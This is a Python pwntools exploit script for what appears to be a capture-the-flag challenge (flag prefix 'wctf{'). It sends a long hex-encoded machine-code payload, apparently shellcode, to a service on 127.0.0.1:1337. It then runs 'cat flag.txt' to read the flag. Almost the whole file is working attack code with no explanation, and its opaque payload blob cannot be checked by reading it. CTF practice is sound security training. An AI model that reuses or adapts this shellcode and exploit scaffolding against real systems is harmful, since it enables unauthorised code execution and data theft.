#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/chal')
#libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

#io = start()
io = remote('127.0.0.1', 1337)

payload = "9103404600000000000000001b802b8001000000ff7f00400000000000000000000000000000000000000dff010079b76efb0b0078823f00c881390048810f2009209081172012201885f081688568c41dc02e003dc02e003dc02e003dc090c4c8c4608427202420a8842f202d20f0843720362014801d80d0c2130018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c048810f200920f0810e000e000e000e0001c00e0001c00e0001c00e0001c00e005081172012201a8019c00e0016001a8019c00e0016001a8019c00e0016001a8019c00e00160048810f20092048c4c8c448850f20092088c4f081908511c00e0001c00e0001c00e0001c0608427202420a8842f202d20f0843720362014801d80d0c2130018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c048810f200920f0810e000e000e000e000e000e000e000e0048c4c8c4488588c4d08511c00e00108611c00e0001c00e0001c0608427202420a8842f202d20f0843720362014801d80d0c2130018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c0c88121002900310060c4a8c4f0c4a0c3e8c330c4e0822720242028832f202d20708337203620888209002120242029202d203120362025202420e145e0822720242021202420f082372036203120362025202c202620252068832f202d20292025202420a140c040c881c04008824040a08327202420e8832f202d20308437203620608427202420a8842f202d20f0843720362014801d80d0c21300110018c350c316c00060"
#assembly = open('exploit.bin','rb').read();
assembly = bytes.fromhex(payload)
log.info(b"Machine code = "+assembly)
io.sendline(assembly)

io.clean()
io.sendline(b'cat flag.txt')
result = str(io.recv().decode('ascii'))
if 'wctf{' in result:
    print(result)
    exit(0)
exit(1)
